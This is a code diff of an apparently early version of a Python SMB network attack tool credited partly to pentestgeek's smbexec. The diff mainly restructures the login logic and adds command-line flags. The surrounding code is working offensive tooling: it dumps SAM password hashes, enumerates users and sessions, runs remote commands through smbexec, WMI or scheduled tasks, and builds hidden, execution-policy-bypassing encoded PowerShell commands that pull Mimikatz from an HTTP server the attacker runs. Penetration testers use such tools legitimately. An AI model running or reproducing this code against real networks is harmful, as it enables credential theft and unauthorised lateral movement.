@@ -47,10 +47,6 @@ BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
 SMBSERVER_DIR   = 'served_over_smb'
 DUMMY_SHARE     = 'TMP'
 
-logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
-log = logging.getLogger()
-log.setLevel(logging.INFO)
-
 # Structures
 # Taken from http://insecurety.net/?p=768
 class SAM_KEY_DATA(Structure):
@@ -1778,119 +1774,120 @@ def connect(host):
 
         print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
 
-        lmhash = ''
-        nthash = ''
-        if args.hash:
-            lmhash, nthash = args.hash.split(':')
+        if args.user is not None and (args.passwd is not None or args.hash is not None):
+            lmhash = ''
+            nthash = ''
+            if args.hash:
+                lmhash, nthash = args.hash.split(':')
 
-        noOutput = False
-        smb.login(args.user, args.passwd, domain, lmhash, nthash)
+            noOutput = False
+            smb.login(args.user, args.passwd, domain, lmhash, nthash)
 
-        if args.download:
-            try:
-                out = open(args.download.split('\\')[-1], 'wb')
-                smb.getFile(args.share, args.download, out.write)
-            except SessionError as e:
-                print '[-] {}:{} {}'.format(host, args.port, e)
+            if args.download:
+                try:
+                    out = open(args.download.split('\\')[-1], 'wb')
+                    smb.getFile(args.share, args.download, out.write)
+                except SessionError as e:
+                    print '[-] {}:{} {}'.format(host, args.port, e)
 
-        if args.delete:
-            try:
-                smb.deleteFile(args.share, args.delete)
-            except SessionError as e:
-                print '[-] {}:{} {}'.format(host, args.port, e)
+            if args.delete:
+                try:
+                    smb.deleteFile(args.share, args.delete)
+                except SessionError as e:
+                    print '[-] {}:{} {}'.format(host, args.port, e)
 
-        if args.upload:
-            try:
-                up = open(args.upload[0] , 'rb')
-                smb.putFile(args.share, args.upload[1], up.read)
-            except SessionError as e:
-                print '[-] {}:{} {}'.format(host, args.port, e)
+            if args.upload:
+                try:
+                    up = open(args.upload[0] , 'rb')
+                    smb.putFile(args.share, args.upload[1], up.read)
+                except SessionError as e:
+                    print '[-] {}:{} {}'.format(host, args.port, e)
 
-        if args.list:
-            try:
-                dir_list = smb.listPath(args.share, args.list + '\\*')
-                print "[+] {}:{} Contents of {}:".format(host, args.port, args.list)
-                for f in dir_list:
-                    print "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), ctime(float(f.get_mtime_epoch())) ,f.get_longname())
-            except SessionError as e:
-                print '[-] {}:{} {}'.format(host, args.port, e)
+            if args.list:
+                try:
+                    dir_list = smb.listPath(args.share, args.list + '\\*')
+                    print "[+] {}:{} Contents of {}:".format(host, args.port, args.list)
+                    for f in dir_list:
+                        print "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), ctime(float(f.get_mtime_epoch())) ,f.get_longname())
+                except SessionError as e:
+                    print '[-] {}:{} {}'.format(host, args.port, e)
 
-        if args.spider:
-            start_time = time()
-            print "[+] {}:{} {} Started spidering".format(host, args.port, domain)
-            spider(smb, host, args.share, args.spider, args.pattern, args.depth)
-            print "[+] {}:{} {} Done spidering (Completed in {})".format(host, args.port, domain, time() - start_time)
+            if args.spider:
+                start_time = time()
+                print "[+] {}:{} {} Started spidering".format(host, args.port, domain)
+                spider(smb, host, args.share, args.spider, args.pattern, args.depth)
+                print "[+] {}:{} {} Done spidering (Completed in {})".format(host, args.port, domain, time() - start_time)
 
-        if args.enum_sessions:
-            rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
-            sessions = rpcenum.enum_sessions(host)
-            print "[+] {}:{} {} Current active sessions:".format(host, args.port, domain)
-            for session in sessions:
-                for fname in session.fields.keys():
-                    print fname, session[fname]
-                print "\n"
+            if args.enum_sessions:
+                rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
+                sessions = rpcenum.enum_sessions(host)
+                print "[+] {}:{} {} Current active sessions:".format(host, args.port, domain)
+                for session in sessions:
+                    for fname in session.fields.keys():
+                        print fname, session[fname]
+                    print "\n"
 
-        if args.enum_lusers:
-            rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
-            lusers = rpcenum.enum_logged_on_users(host)
-            print "[+] {}:{} {} Logged on users:".format(host, args.port, domain)
-            for luser in lusers:
-                for fname in luser.fields.keys():
-                    print fname, luser[fname]
-                print "\n"
+            if args.enum_lusers:
+                rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
+                lusers = rpcenum.enum_logged_on_users(host)
+                print "[+] {}:{} {} Logged on users:".format(host, args.port, domain)
+                for luser in lusers:
+                    for fname in luser.fields.keys():
+                        print fname, luser[fname]
+                    print "\n"
 
-        if args.sam:
-            sec_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash)
-            sam_dump = sec_dump.dump(smb)
-            print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, domain)
-            for sam_hash in sam_dump:
-                print sam_hash
-            sec_dump.cleanup()
+            if args.sam:
+                sec_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash)
+                sam_dump = sec_dump.dump(smb)
+                print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, domain)
+                for sam_hash in sam_dump:
+                    print sam_hash
+                sec_dump.cleanup()
 
-        if args.enum_users:
-            user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash).dump(host)
-            print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
+            if args.enum_users:
+                user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash).dump(host)
+                print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
 
-        if args.mimikatz:
-            noOutput = True
-            local_ip = smb.getSMBServer().get_socket().getsockname()[0]
-            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip))
+            if args.mimikatz:
+                noOutput = True
+                local_ip = smb.getSMBServer().get_socket().getsockname()[0]
+                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip))
 
-        if args.pscommand:
-            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
+            if args.pscommand:
+                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
 
-        if args.command:
+            if args.command:
 
-            if args.execm == 'smbexec':
-                executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command, noOutput)
-                result = executer.run(host)
-                print '[+] {}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, domain)
-                if result:
-                    print result
+                if args.execm == 'smbexec':
+                    executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command, noOutput)
+                    result = executer.run(host)
+                    print '[+] {}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, domain)
+                    if result:
+                        print result
 
-            elif args.execm == 'wmi':
-                executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
-                result = executer.run(host, smb)
-                print '[+] {}:{} {} Executed specified command via WMI'.format(host, args.port, domain)
-                if result:
-                    print result
+                elif args.execm == 'wmi':
+                    executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
+                    result = executer.run(host, smb)
+                    print '[+] {}:{} {} Executed specified command via WMI'.format(host, args.port, domain)
+                    if result:
+                        print result
 
-            elif args.execm == 'atexec':
-                atsvc_exec = TSCH_EXEC(args.user, args.passwd, args.command, domain, args.hash, noOutput)
-                atsvc_exec.play(host)
-                print '[+] {}:{} {} Executed specified command via ATEXEC'.format(host, args.port, domain)
-                if atsvc_exec.output:
-                    print atsvc_exec.output
+                elif args.execm == 'atexec':
+                    atsvc_exec = TSCH_EXEC(args.user, args.passwd, args.command, domain, args.hash, noOutput)
+                    atsvc_exec.play(host)
+                    print '[+] {}:{} {} Executed specified command via ATEXEC'.format(host, args.port, domain)
+                    if atsvc_exec.output:
+                        print atsvc_exec.output
 
-                atsvc_exec.cleanup()
+                    atsvc_exec.cleanup()
 
-        if args.list_shares:
-            share_list = _listShares(smb)
-            print '[+] {}:{} {} Available shares:'.format(host, args.port, domain)
-            print '\tSHARE\t\t\tPermissions'
-            print '\t-----\t\t\t-----------'
-            for share, perm in share_list.iteritems():
-                print '\t{}\t\t\t{}'.format(share, perm)
+            if args.list_shares:
+                share_list = _listShares(smb)
+                print '[+] {}:{} {} Available shares:'.format(host, args.port, domain)
+                print '\tSHARE\t\t\tPermissions'
+                print '\t-----\t\t\t-----------'
+                for share, perm in share_list.iteritems():
+                    print '\t{}\t\t\t{}'.format(share, perm)
 
         try:
             smb.logoff()
@@ -1929,13 +1926,14 @@ if __name__ == '__main__':
               @pentestgeek's smbexec https://github.com/pentestgeek/smbexec""",
                                     formatter_class=RawTextHelpFormatter)
 
-    parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
-    parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
-    parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
+    parser.add_argument("-t", type=int, dest="threads", required=True, help="Set how many concurrent threads to use")
+    parser.add_argument("-u", metavar="USERNAME", dest='user', default=None, help="Username, if omitted null session assumed")
+    parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default=None, help="Password")
+    parser.add_argument("-H", metavar="HASH", dest='hash', default=None, help='NTLM hash')
     parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
     parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
     parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
-    parser.add_argument("-t", default=10, type=int, dest="threads", help="Set how many concurrent threads to use")
+    parser.add_argument("-v", action='store_true', dest='verbose', help="Enable verbose output")
     parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
     rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
@@ -1951,7 +1949,7 @@ if __name__ == '__main__':
     sgroup = parser.add_argument_group("Spidering", "Options for spidering shares")
     sgroup.add_argument("--spider", metavar='FOLDER', type=str, default='', help='Folder to spider (defaults to share root dir)')
     sgroup.add_argument("--pattern", type=str, default= '', help='Pattern to search for in filenames and folders')
-    sgroup.add_argument("--patternfile", type=argparse.FileType('r'), help='File containing patters to search for')
+    sgroup.add_argument("--patternfile", type=argparse.FileType('r'), help='File containing patterns to search for')
     sgroup.add_argument("--depth", type=int, default=1, help='Spider recursion depth (default 1)')
 
     cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
@@ -1966,6 +1964,12 @@ if __name__ == '__main__':
     bgroup.add_argument("--delete", dest="delete", metavar="PATH", help="Delete a remote file")
 
     args = parser.parse_args()
+
+    if args.verbose:
+        print "[*] Verbose output enabled"
+        logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+        log = logging.getLogger()
+        log.setLevel(logging.INFO)
 
     hosts = IPNetwork(args.target[0])
 
@@ -1991,7 +1995,7 @@ if __name__ == '__main__':
 
     if args.mimikatz:
         print "[*] Press CTRL-C at any time to exit"
-        print '[*] Note: This might take some time on large networks! Go grab a redbull!\n'
+        print '[*] Note: This might take some time on large networks! Go grab a redbull!'
         server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
         t = Thread(name='HTTPServer', target=server.serve_forever)
         t.setDaemon(True)
